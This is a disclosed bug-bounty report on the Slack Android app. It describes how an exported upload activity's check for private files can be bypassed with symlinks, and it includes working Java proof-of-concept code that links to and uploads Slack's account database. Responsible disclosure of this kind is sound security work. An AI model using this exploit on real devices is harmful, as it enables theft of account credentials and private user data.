# Private application files can be uploaded to Slack via malicious uploader

## Report Details
- **Report ID**: 375083
- **URL**: https://hackerone.com/reports/375083
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-01T21:21:38.639Z
- **Disclosed**: 2021-08-04T14:35:24.669Z

## Reporter
- **Username**: shell_c0de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Hi. I have found an issue which allows to retrieve any files from `/data/data/com.Slack/*` directory. The problem is in exported activity `com.Slack.ui.UploadActivity` which accepts a URI to download files. I see that you've added verification
```java
private static boolean isPrivateFile(Uri uri) {
        return uri.getPathSegments().contains("com.Slack");
    }
```
You can bypass the verification using symlink files. Malicious code:
```java
 StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
    StrictMode.setVmPolicy(builder.build());
    new File("/data/data/com.example.route.readfileapk/").setReadable(true,false);
    new File("/data/data/com.example.route.readfileapk/").setWritable(true,false);
    new File("/data/data/com.example.route.readfileapk/").setExecutable(true,false);
   
       try {
            Runtime.getRuntime().exec("ln -s /data/data/com.Slack/databases/account_manager /data/data/com.example.route.readfileapk/account_manager").waitFor();
        }
        catch(Exception e) {
            e.printStackTrace();
            finish();
            return;
        }
        new File("/data/data/com.example.route.readfileapk/account_manager").setReadable(true,false);
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.Slack", "com.Slack.ui.UploadActivity");
        intent.setType("*/*");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.example.route.readfileapk/account_manager"));
        startActivity(intent);
```
Malware creates a link to your file `/data/data/com.Slack/databases/account_manager` (where `com.example.route.readfileapk` is package name of the malware), grants read/execute permission to any user (I mean Linux users), and starts your activity with the new URI.

## Impact

This vulnerability can get a complete account, malware can access everything, including cookies, history and e-mail.

## Attachments
- JhxHDcibKVI.jpg
- 2451RVhK2S8.jpg
- PQzofS_icd4.jpg
- com.example.route.readfileapk.apk
- DSxS8FlOR7M.jpg
